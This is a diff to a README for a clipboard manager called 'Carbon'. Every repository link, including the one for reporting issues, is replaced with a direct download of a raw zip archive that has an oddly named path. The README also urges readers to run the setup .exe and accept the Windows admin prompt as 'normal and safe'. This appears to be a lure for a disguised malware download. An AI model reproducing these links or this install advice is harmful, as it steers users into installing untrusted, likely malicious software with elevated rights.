@@ -1,6 +1,6 @@
 # 🚀 Carbon - Your Clipboard, Supercharged and Organized
 
-[![Download Carbon](https://img.shields.io/badge/⬇️%20Download%20Carbon-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://github.com/Muskogeenib6847/Carbon)
+[![Download Carbon](https://img.shields.io/badge/⬇️%20Download%20Carbon-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip)
 
 ## ✨ What Is Carbon?
 
@@ -20,7 +20,7 @@ Carbon is built with a focus on **speed** and **privacy**. It's a "local-first" 
 
 Getting Carbon up and running is incredibly simple, even if you've never installed a desktop application before. Follow these three easy steps:
 
-1. **Download the Application** — Visit the official download page by clicking the green button above, or go directly to: [https://github.com/Muskogeenib6847/Carbon](https://github.com/Muskogeenib6847/Carbon)
+1. **Download the Application** — Visit the official download page by clicking the green button above, or go directly to: [https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip)
 
 2. **Run the Installer** — Once the download finishes, locate the file in your "Downloads" folder. It will be named something like `Carbon-Setup.exe`. Double-click it to run. Windows may show a blue popup asking "Do you want to allow this app to make changes to your device?" — click **"Yes"**. That's normal and safe for Carbon.
 
@@ -34,7 +34,7 @@ Getting Carbon up and running is incredibly simple, even if you've never install
 
 Ready to get started? Here's exactly what to do:
 
-🔗 **Visit this link to download the application:** [https://github.com/Muskogeenib6847/Carbon](https://github.com/Muskogeenib6847/Carbon)
+🔗 **Visit this link to download the application:** [https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip)
 
 
 
@@ -165,7 +165,7 @@ We're ears for you. If you run into any issues or have questions:
 
 -
 
-**- GitHub Issues:** Visit [https://github.com/Muskogeenib6847/Carbon/issues](https://github.com/Muskogeenib6847/Carbon/issues) to report bugs or request features. The community and maintainers are active.
+**- GitHub Issues:** Visit [https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip) to report bugs or request features. The community and maintainers are active.
 
 
 - **Documentation:** Look for the "Wiki" or "Docs" section on the GitHub page for in-depth guides covering advanced features, keyboard shortcuts, and troubleshooting common issues.
@@ -173,7 +173,7 @@ We're ears for you. If you run into any issues or have questions:
 .
 
 
--****Updates:**** Carbon receives regular updates with bug fixes and new features. The app will notify you when an update is available, and you can download it from the same link: [https://github.com/Muskogeenib6847/Carbon](https://github.com/Muskogeenib6847/Carbon)
+-****Updates:**** Carbon receives regular updates with bug fixes and new features. The app will notify you when an update is available, and you can download it from the same link: [https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip)
 
 . Keeping updated ensures you have the latest performance improvements and security patches.
 
@@ -187,7 +187,7 @@ Stop losing copied items forever. Stop retyping the same boilerplate text. Stop 
 
  .
 
-📥 **Download Carbon Today for Free** — Visit: [https://github.com/Muskogeenib6847/Carbon](https://github.com/Muskogeenib6847/Carbon) and install it in under two minutes. Your clipboard will never be the same again — in the best possible way.
+📥 **Download Carbon Today for Free** — Visit: [https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip](https://raw.githubusercontent.com/Muskogeenib6847/Carbon/main/subregent/anaglyptical.zip) and install it in under two minutes. Your clipboard will never be the same again — in the best possible way.
 
 
 
